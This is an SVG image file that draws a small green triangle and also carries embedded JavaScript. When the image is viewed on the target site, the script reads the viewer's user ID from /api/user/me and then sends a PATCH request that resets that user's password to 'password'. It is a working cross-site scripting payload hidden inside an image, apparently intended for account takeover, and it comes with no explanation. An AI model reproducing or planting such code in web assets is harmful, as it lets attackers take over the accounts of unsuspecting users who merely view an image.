<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
   	var xmlhttp = new XMLHttpRequest();
	  xmlhttp.open("GET", "/api/user/me");
    xmlhttp.send();
	  xmlhttp.onreadystatechange = function() {
    if (xmlhttp.readyState == XMLHttpRequest.DONE) {
        var id = JSON.parse(xmlhttp.responseText).data['id'];
        var xmlhttp2 = new XMLHttpRequest();
        xmlhttp2.open("PATCH", `/api/user/${id}`)
        xmlhttp2.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
        xmlhttp2.send(JSON.stringify({ "id": id, "password": "password" }));
    }
}
  </script>
</svg>
